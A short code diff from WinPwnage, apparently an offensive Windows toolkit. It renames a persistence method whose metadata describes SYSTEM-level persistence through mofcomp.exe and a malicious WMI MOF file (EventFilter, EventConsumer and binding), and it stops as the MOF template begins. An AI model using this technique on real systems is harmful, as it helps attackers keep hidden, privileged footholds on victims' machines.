@@ -4,10 +4,10 @@ import tempfile
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
-persistMethod2_info = {
+persistMethod1_info = {
 	"Description": "Persistence using mofcomp.exe (SYSTEM privileges)",
 	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
-	"Id": "2",
+	"Id": "1",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
 	"Works From": "7600",
@@ -16,7 +16,7 @@ persistMethod2_info = {
 	"Function Payload": True,
 }
 
-def persistMethod2(payload, name="", add=True):
+def persistMethod1(payload, name="", add=True):
 	if add:
 		if payloads().exe(payload):
 			mof_template = '''#PRAGMA AUTORECOVER
